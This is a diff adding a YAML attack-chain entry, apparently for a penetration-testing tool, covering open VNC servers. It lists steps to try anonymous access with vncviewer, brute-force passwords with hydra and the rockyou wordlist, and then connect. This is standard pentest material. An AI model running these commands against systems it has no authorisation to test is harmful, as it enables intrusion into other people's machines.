@@ -1,0 +1,34 @@
+chain_id: vnc_no_auth
+title: "VNC — anonymous / weak-password graphical session"
+severity: HIGH
+tags: [vnc, no-auth, graphical, default-creds]
+
+trigger:
+  any_of:
+    - { port: 5900 }
+    - { port: 5901 }
+    - { port: 5902 }
+    - { service: vnc }
+    - { service_pattern: "(?i)vnc" }
+
+description: |
+  Open VNC server. Many deployments accept null auth or have weak 8-byte
+  passwords (the legacy VNC protocol caps passwords at 8 chars). Either
+  way, the result is a fully interactive graphical session — useful even
+  when SSH/WinRM are locked down.
+
+steps:
+  - id: 1
+    title: "Try anonymous"
+    command: vncviewer $VICTIMA
+
+  - id: 2
+    title: "Brute-force common passwords (very fast — protocol is stateless)"
+    command: hydra -P /usr/share/wordlists/rockyou.txt $VICTIMA -s 5900 vnc
+
+  - id: 3
+    title: "Connect with a recovered password"
+    command: vncviewer $VICTIMA::5900
+
+references:
+  - https://book.hacktricks.xyz/network-services-pentesting/pentesting-vnc
